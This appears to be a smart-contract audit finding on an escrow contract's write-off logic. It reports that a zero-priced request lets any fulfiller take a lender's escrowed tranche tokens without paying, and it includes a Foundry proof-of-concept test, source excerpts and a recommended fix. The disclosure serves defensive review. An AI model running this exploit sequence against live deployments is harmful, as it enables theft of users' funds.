### Title

Zero-priced write-off requests let any fulfiller seize escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary

`createWriteOffRequest()` rejects a zero tranche deposit but accepts `underlyingsRequested == 0`. `fullfillWriteOffRequest()` is permissionless and only requires the payment to be at least the recorded request, so a zero-underlying request can be fulfilled with zero payment while the fulfiller receives all escrowed tranche tokens. [1](#0-0) [2](#0-1) 

### Finding Description

During a running epoch, a lender can call `createWriteOffRequest(amount, 0)`. The contract accepts the call because it validates only `amount != 0`, transfers `amount` tranche tokens into escrow, and records `underlyings == 0`. [1](#0-0) 

Any unprivileged fulfiller can then call `fullfillWriteOffRequest(lender, amount, 0)`. The underpayment check passes because `0 < currentRequest.underlyings` is false when the request is zero, after which the request is deleted and the full `amount` of tranche tokens is transferred to the attacker. [2](#0-1) 

This is the same missing-state class as the kernel bug: the request's presence is checked through `tranches`, but the economic output leg can still be null. The code then consumes the record as though it represented a funded exchange. [3](#0-2) 

### Impact Explanation

An attacker receives the victim's entire escrowed tranche position without transferring any underlying or paying an exit fee. For example, a request escrowing `10_000e18` tranche tokens can be claimed for zero underlying; if those tranches price at $1 each, the direct loss is approximately $10,000. [4](#0-3) 

The broken invariant is that escrowed tranche tokens are released only in exchange for the consideration requested by the lender. There is no borrower-default requirement, privileged action, or subsequent write-off requirement protecting this transfer. [5](#0-4) 

### Likelihood Explanation

The exploit requires a lender to create a request with a zero underlying amount, such as through a malformed integration call or an unset UI field. Once that transaction is confirmed, every EOA or contract can permissionlessly fulfill it, and no KYC, owner, borrower, or fulfiller authorization check applies. [6](#0-5) 

### Recommendation

Reject `underlyingsRequested == 0` in `createWriteOffRequest()`, matching the existing nonzero validation for `amount`. Additionally, require `_underlyings != 0` or require strict equality with `currentRequest.underlyings` in `fullfillWriteOffRequest()` so a request cannot settle with an empty payment leg. [1](#0-0) [7](#0-6) 

### Proof of Concept

The following Foundry PoC assumes a forked deployment where `idleCDOEpoch.isEpochRunning()` is true and `victim` holds at least `requestTranches` tranche tokens:

```solidity
function testZeroAskWriteOffRequestStealsTranches() public {
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(vm.envAddress("IDLE_CDO_EPOCH"));
    IdleCreditVaultWriteOffEscrow escrow =
        IdleCreditVaultWriteOffEscrow(vm.envAddress("WRITE_OFF_ESCROW"));

    IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
    IERC20Detailed underlying = IERC20Detailed(escrow.underlying());

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    uint256 requestTranches = 10_000e18;

    assertTrue(cdo.isEpochRunning());
    deal(address(tranche), victim, requestTranches, true);

    vm.startPrank(victim);
    tranche.approve(address(escrow), requestTranches);
    escrow.createWriteOffRequest(requestTranches, 0);
    vm.stopPrank();

    uint256 victimUnderlyingBefore = underlying.balanceOf(victim);
    uint256 attackerTranchesBefore = tranche.balanceOf(attacker);

    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(victim, requestTranches, 0);

    assertEq(underlying.balanceOf(victim), victimUnderlyingBefore);
    assertEq(tranche.balanceOf(attacker) - attackerTranchesBefore, requestTranches);
    assertEq(tranche.balanceOf(address(escrow)), 0);
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);

    // If the fulfiller is the borrower, they can then choose to either keep the tranche tokens or write them off via
    // IdleCDOEpochVariant.writeOffDeposit method.
  }
